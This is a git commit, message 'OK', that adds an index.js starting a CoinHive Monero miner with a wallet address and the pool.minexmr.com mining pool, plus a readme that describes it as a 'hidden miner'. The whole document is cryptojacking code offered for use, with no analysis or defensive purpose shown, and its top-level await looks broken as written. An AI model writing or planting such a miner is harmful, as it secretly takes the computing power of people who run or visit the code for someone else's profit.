3d72946ff587d0e02ac1949aef797268abdcb4c0
Misha Marinenko <wh0amiofficial@pm.me>
2018-06-12 22:59:18 +0300

    OK

---
+++ index.js
@@ -0,0 +1,10 @@
+const CoinHive = require('coin-hive');
+var express = require("express");
+var app = express();
+const miner = await CoinHive('4Hm3YrYNgczRAP7jbGCZ7vA8XwbBR8DWMU7Bm9FKZqjxQXPPcwMP1kDbK3mtBSdt2c6TmLCPiMSXa39uBiEBwkg4FU7sGrPH1rz1Rnhh2M', {
+    pool: {
+      host: 'pool.minexmr.com',
+      port: 4444
+    }
+  });
+miner.start();
---
+++ readme.md
@@ -0,0 +1,2 @@
+# this is hidden miner 
+# using coin-hive
